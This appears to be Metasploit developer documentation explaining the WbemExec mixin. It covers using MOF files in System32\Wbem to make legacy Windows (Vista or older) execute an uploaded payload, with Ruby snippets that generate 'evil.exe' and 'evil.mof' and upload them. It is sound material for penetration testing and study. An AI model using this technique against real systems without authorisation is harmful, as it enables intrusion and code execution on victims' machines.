Windows Management Instrumentation (WMI) is Microsoft's implementation of Web-Based Enterprise Management (WBEM), which uses Managed Object Format (MOF) to create Common Information Model (CIM) classes. The security community was actually unfamiliar with the evilness of this technology until the birth of Stuxnet, which used a MOF file to exploit a vulnerability allowing the attacker to create files via a fake Printer Spooler service. This technique was later reverse-engineered and demonstrated in Metasploit's [ms10_061_spoolss.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb) module, and that significantly changed how we approach write-privilege attacks. Generally speaking, if you find yourself being able to write to system32, you can most likely take advantage of this technique.

### Requirements

To to able to use the ```WBemExec``` mixin, you must meet these requirements:

* Write permission to C:\Windows\System32\
* Write permission to C:\Windows\System32\Wbem\
* The target must NOT be newer than Windows Vista (so mostly good for XP, Win 2003, or older). This is more of a limitation from the API, not the technique. Newer Windows operating systems need the MOF file to be pre-compiled first.

### Usage

First, include the ```WbemExec``` mixin under the scope of your ```MetasploitModule``` class. You will also need the ```EXE``` mixin to generate an executable:

```ruby
include Msf::Exploit::EXE
include Msf::Exploit::WbemExec
```

Next, generate a payload name and the executable:

```ruby
payload_name = "evil.exe"
exe = generate_payload_exe
```

And then generate the mof file using the ```generate_mof``` method. The first argument should be the name of the mof file, and the second argument is the payload name:

```ruby
mof_name = "evil.mof"
mof = generate_mof(mof_name, payload_name)
```

Now you're ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to ```C:\Windows\System32\```.

```ruby
upload_file_to_system32(payload_name, exe) # Write your own upload method
```

And then now you can upload the mof file to ```C:\Windows\System32\wbem\```:

```ruby
upload_mof(mof_name, mof) # Write your own upload method
```

Once the mof file is uploaded, the Windows Management Service should pick that up and execute it, which will end up executing your payload in system32. Also, the mof file will automatically be moved out of the mof directory after use.

### References

- <https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb>
- <https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb>
